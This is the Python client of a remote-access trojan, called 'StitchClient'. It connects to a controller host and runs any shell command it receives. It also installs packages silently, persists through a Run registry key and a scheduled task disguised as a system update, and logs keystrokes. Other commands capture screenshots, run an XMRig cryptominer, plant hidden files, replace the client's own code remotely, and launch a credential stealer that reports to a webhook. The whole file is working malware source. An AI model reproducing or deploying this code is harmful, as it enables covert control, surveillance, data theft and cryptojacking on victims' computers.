import socket
import threading
import subprocess
import sys
import os
import platform
import base64
import time

# ========== AUTO INSTALL MISSING PACKAGES ==========
def auto_install_packages():
    required = {
        'psutil': 'psutil',
        'pynput': 'pynput',
        'PIL': 'pillow',
        'Crypto': 'pycryptodome',
        'rich': 'rich',
        'cloudscraper': 'cloudscraper',
        'win32crypt': 'pywin32'
    }
    for mod, pkg in required.items():
        try:
            if mod == 'PIL':
                __import__('PIL')
            elif mod == 'Crypto':
                __import__('Crypto')
            else:
                __import__(mod)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '--user', pkg], capture_output=True)

auto_install_packages()

from core.helpers import send_msg, recv_msg, kill_xmrig
from core.persistence import ensure_persistence
from core.miner import start_miner, stop_miner, miner_status, miner_log, set_miner_log_callback
from core.screenshot import take_screenshot
from core.config import HIDDEN_DIR
from pynput import keyboard

class StitchClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.keylog_buffer = []
        self.keylog_active = False
        self.running = True
        self.current_sock = None
        set_miner_log_callback(self.send_miner_log)

    def send_miner_log(self, msg):
        if self.current_sock:
            try:
                send_msg(self.current_sock, f"MINER_LOG:{msg}")
            except:
                pass

    def run(self):
        ensure_persistence()
        self.connect()

    def connect(self):
        while self.running:
            try:
                s = socket.socket()
                s.connect((self.host, self.port))
                self.current_sock = s
                self.handle(s)
            except:
                time.sleep(5)

    def handle(self, s):
        s.settimeout(1)
        last_ping = time.time()
        while self.running:
            try:
                cmd = recv_msg(s)
                if cmd:
                    if cmd == "ping":
                        send_msg(s, "pong")
                    else:
                        resp = self.exec(cmd)
                        send_msg(s, resp)
            except socket.timeout:
                pass
            except:
                break
            if time.time() - last_ping > 30:
                try:
                    send_msg(s, "ping")
                    last_ping = time.time()
                except:
                    break
        s.close()
        self.current_sock = None

    def exec(self, cmd):
        parts = cmd.strip().split(maxsplit=1)
        if not parts:
            return "OK"
        c = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''
        if c == 'shell':
            r = subprocess.run(arg, shell=True, capture_output=True, text=True)
            return r.stdout + r.stderr
        elif c == 'screenshot':
            return take_screenshot()
        elif c == 'keylog_start':
            if not self.keylog_active:
                self.keylog_active = True
                threading.Thread(target=self._keylog, daemon=True).start()
                return "[+] Keylogger started"
            return "Already running"
        elif c == 'keylog_stop':
            self.keylog_active = False
            return "[+] Stopped"
        elif c == 'keylog_dump':
            data = ''.join(self.keylog_buffer)
            self.keylog_buffer.clear()
            return data if data else "[no keys]"
        elif c == 'persistence':
            ensure_persistence()
            return "[+] Persistence ensured."
        elif c == 'sysinfo':
            return f"Host: {socket.gethostname()}\nOS: {platform.platform()}\nUser: {os.getlogin()}"
        elif c == 'miner':
            return start_miner()
        elif c == 'miner_stop':
            return stop_miner()
        elif c == 'miner_status':
            return miner_status()
        elif c == 'miner_log':
            return miner_log()
        elif c.startswith('upload'):
            try:
                if ':' not in arg:
                    return "Usage: upload <filename> <base64_content>"
                filename, b64 = arg.split(':', 1)
                content = base64.b64decode(b64)
                dest = os.path.join(HIDDEN_DIR, os.path.basename(filename))
                with open(dest, 'wb') as f:
                    f.write(content)
                from core.helpers import set_hidden_readonly
                set_hidden_readonly(dest)
                return f"[+] File uploaded to {dest}"
            except Exception as e:
                return f"[-] Upload failed: {e}"
        elif c == 'update_code':
            try:
                new_code = base64.b64decode(arg).decode('utf-8')
                with open(__file__, 'w', encoding='utf-8') as f:
                    f.write(new_code)
                from core.persistence import create_backups
                create_backups()
                subprocess.Popen([sys.executable, __file__])
                return "[+] Code updated. Client will restart."
            except Exception as e:
                return f"[-] Update failed: {e}"
        elif c == 'clean':
            kill_xmrig()
            subprocess.run(['taskkill', '/F', '/IM', 'pythonw.exe'], capture_output=True)
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                    winreg.DeleteValue(k, "SystemUpdate")
            except: pass
            subprocess.run(['schtasks', '/delete', '/tn', 'SystemUpdateTask', '/f'], capture_output=True)
            import shutil
            for d in [HIDDEN_DIR, os.path.join(os.environ.get('APPDATA', ''), 'XMRigTest')]:
                if os.path.exists(d):
                    shutil.rmtree(d, ignore_errors=True)
            return "[+] Cleanup done."
        elif c == 'stealer':
            threading.Thread(target=self._full_stealer, daemon=True).start()
            return "[+] Muck Stealer started. Results will be sent to webhook."
        else:
            return f"Unknown: {c}"

    def _keylog(self):
        def on_press(k):
            try:
                self.keylog_buffer.append(k.char)
            except:
                self.keylog_buffer.append(f'[{k}]')
        with keyboard.Listener(on_press=on_press) as listener:
            while self.keylog_active:
                time.sleep(0.1)
            listener.stop()

    def _full_stealer(self):
        try:
            from stealer.gather import GatherAll
            GatherAll()
        except Exception as e:
            from stealer.core import send_webhook
            send_webhook(f"Stealer error: {e}")